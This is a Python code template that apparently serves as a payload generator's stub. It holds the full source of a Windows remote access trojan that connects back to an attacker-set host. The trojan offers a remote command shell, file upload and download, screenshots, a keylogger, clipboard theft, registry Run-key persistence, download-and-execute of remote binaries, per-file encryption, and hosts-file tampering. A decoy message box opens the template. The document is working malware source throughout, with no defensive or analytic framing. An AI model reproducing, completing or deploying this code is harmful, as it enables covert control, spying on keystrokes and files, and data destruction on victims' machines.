template = """
MB_OK = 0x0
MB_ICONINFORMATION = 0x40

user32 = ctypes.windll.user32
user32.MessageBoxW(None, display_message, caption, MB_OK | MB_ICONINFORMATION)


is_keylog = False
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def reliable_send(data):
    data = b64encode(encryptcon(data.encode("utf-8"))).decode("utf-8")
    sjson = dumps(data)
    s.send(sjson.encode())

def encryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    padded = pad(message, AES.block_size)
    return aes.encrypt(padded)

def decryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    decrypt = aes.decrypt(message)
    unpadded = unpad(decrypt, AES.block_size)
    return(unpadded)

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(8096).decode().rstrip()
            return decryptcon(b64decode(loads(data))).decode("utf-8")
        except ValueError:
            continue

def encrypt(infile,  key):
    if os.path.exists(infile) == False:
        reliable_send("file does not exist")
    else:
        try:
            f = Fernet(key)
            with open(infile, "rb") as i:
                file_data = i.read()
                encrypted_data = f.encrypt(file_data)
                i.close()
            with open(infile, "wb") as out:
                out.write(encrypted_data)
                i.close()
            reliable_send("file encrypted")
        except:
            reliable_send("It can only encrypt one file not a whole directory")
    comm()

def decrypt(filename, key):
    if os.path.exists(filename) == False:
        reliable_send("file does not exist")
    else:
        try:
            f = Fernet(key)
            with open(filename, "rb") as i:
                encrypted_data = i.read()
                i.close()
            decrypted_data = f.decrypt(encrypted_data)
            with open(filename, "wb") as out:
                out.write(decrypted_data)
                out.close()
            reliable_send("file decrypted")
        except:
            reliable_send("It can only encrypt one file not a whole directory")
    comm()

def shell():
    while True:
        command = reliable_recv()
        match command:
            case "exit":
                comm()
            case 'quit':
                break
            case 'background' | "clear" | "cls":
                pass
            case str() if command[:3] == 'cd ':
                try:
                    os.chdir(command[3:])
                except Exception as e:
                    print(e)
                    pass
            case _:
                try:
                    process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, universal_newlines=True)
                    output, error = process.communicate(timeout=7)
                    reliable_send(output + error)
                except TimeoutExpired:
                    reliable_send("Command execution timed out.")
                except Exception as e:
                    reliable_send(f"Error executing command: {e}")


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(8096)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(8096)
        except socket.timeout:
            break
    s.settimeout(None)
    f.close()


    
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def blockwebsite():
    if check() == "No admin privilege":
        reliable_send("this module requires admin privilege")
    else:
        try:
            redirect = redirect_ip
            website_list = target_web
            with open("C:\Windows\System32\drivers\etc\hosts", 'r+') as f:
                content = f.read()
                for website in website_list:
                    if website in content:
                        pass
                    else:
                        f.write(redirect + " " + website + "\\n")
                f.close()
            reliable_send(f"operation succeeded, {website_list} has been blocked")
        except:
            reliable_send("operation failed")
    comm()

def unblockweb():
    if check() == "No admin privilege":
        reliable_send("this module requires admin privilege")
    else:
        try:
            with open("C:\Windows\System32\drivers\etc\hosts", 'r+') as f:
                f.truncate(0)
                f.close()
                reliable_send("all websites have been unblocked")
        except:
            reliable_send("operation failed")
    comm()

def screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")


def persist(name, file):
    if os.path.isfile(file):
        execute = Popen(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {name} /t REG_SZ /d "{file}" /f', shell=True, stdout=PIPE, stderr=PIPE,stdin=PIPE)
        result = (execute.stdout.read() + execute.stderr.read()).decode()
        reliable_send(result)
    else:
        reliable_send("the file path does not exist")



def clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        win32clipboard.CloseClipboard()
        reliable_send(data.decode("utf-8"))
    except:
        reliable_send("no content in clipboard")

def display(link):
    try:
        response = requests.get(link)
        img = Image.open(BytesIO(response.content))
        img.show()
        reliable_send("image displayed")
    except:
        reliable_send("Could not display image")

def connection():
    while True:
        try:
            sleep(2)
            s.connect((lhost, lport))
            comm()
            s.close()
            break
        except:
            connection()

def module():
    try:
        download_file("daijdowijdawi.exe")
        try:
            process = Popen(".\daijdowijdawi.exe", shell=True, stdout=PIPE, stderr=PIPE, universal_newlines=True)
            output, error = process.communicate(timeout=10)
            reliable_send(output + error)
            os.remove("daijdowijdawi.exe")
        except TimeoutExpired:
            reliable_send("Command execution timed out")
            os.remove("daijdowijdawi.exe")
        except Exception as e:
            reliable_send(f"Error executing command: {e}")
    except:
        pass

def check():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        return("Have admin privilege!!!")
    else:
        return("No admin privilege")

def checkp():
    execute = Popen("ipconfig /displaydns", shell=True, stdout=PIPE, stderr=PIPE,stdin=PIPE)
    result = (execute.stdout.read() + execute.stderr.read()).decode()
    reliable_send(result)

def comm():
    global is_keylog
    while True:
        command = reliable_recv()
        match command:
            case 'quit':
                break
            case 'background' | "clear" | "cls" | "help" | "list_module":
                pass
            case str() if command[:6] == 'upload':
                try:
                    download_file(command[7:])
                except:
                    pass
            case str() if command[:8] == 'download':
                try:
                    upload_file(command[9:])
                except:
                    pass
            case str() if command[:10] == 'screenshot':
                screenshot()
                upload_file('screenshot.png')
                os.remove('screenshot.png')
            case 'keylog_start':
                try:
                    if is_keylog == False:
                        keylog = keylogger.Keylogger()
                        t = Thread(target=keylog.start)
                        t.start()
                        is_keylog = True
                        reliable_send('[+] Keylogger Started!')
                    else:
                        reliable_send('keylogger is already started')
                except Exception as e:
                    print(e)
            case 'keylog_dump':
                if is_keylog == True:
                    keylog = keylogger.Keylogger()
                    logs = keylog.read_logs()
                    reliable_send(logs)
                else:
                    reliable_send("keylog hasnt been started")
            case 'keylog_stop':
                if is_keylog == False:
                    reliable_send("keylog is already stopped")
                else:
                    keylog = keylogger.Keylogger()
                    keylog.self_destruct()
                    reliable_send("keylogger has been stopped")
                    is_keylog = False
            case str() if command[:11] == 'persistence':
                try:
                    reg_name, copy_name = command[12:].split(' ')
                    try:
                        persist(reg_name, copy_name)
                    except:
                        reliable_send("PERSISTENCE FATAL ERROR")
                except:
                    reliable_send("incorrect format")
            case "checkpriv":
                reliable_send(check())
            case str() if command[:7] == 'sendall':
                Popen(command[8:], shell=True, stdout=PIPE, stderr=PIPE,stdin=PIPE)
            case "shell":
                shell()
            case str() if command[:6] == "module":
                module()
            case "checkporn":
                checkp()
            case "blocksite":
                blockwebsite()
            case "unblocksite":
                unblockweb()
            case "check_elevated":
                reliable_send(elevatedcheck())
            case "encrypt":
                key = reliable_recv()
                filepath = reliable_recv()
                if filepath == "exit":
                    comm()
                else:
                    try:
                        raw_s = (r'{}'.format(filepath))
                        raw_k = (key.encode('utf-8'))
                    except:
                        reliable_send("convertion error")
                        comm()
                    try:
                        encrypt(infile=raw_s, key=raw_k)
                    except:
                        reliable_send("error")
                comm()
            case "clip_copy":
                clipboard()
            case str() if command[:7] == "display":
                try:
                    link = command[8:]
                    display(link)
                except:
                    reliable_send("failed")
            case "decrypt":
                key2 = reliable_recv()
                filepath2 = reliable_recv()
                if filepath2 == "exit":
                    comm()
                else:
                    raw_s2 = (r'{}'.format(filepath2))
                    raw_k2 = (key2.encode('utf-8'))
                    try:
                        decrypt(filename=raw_s2, key=raw_k2)
                    except:
                        reliable_send("error")
                comm()
            case _:
                reliable_send("command does not exist")


connection()




"""
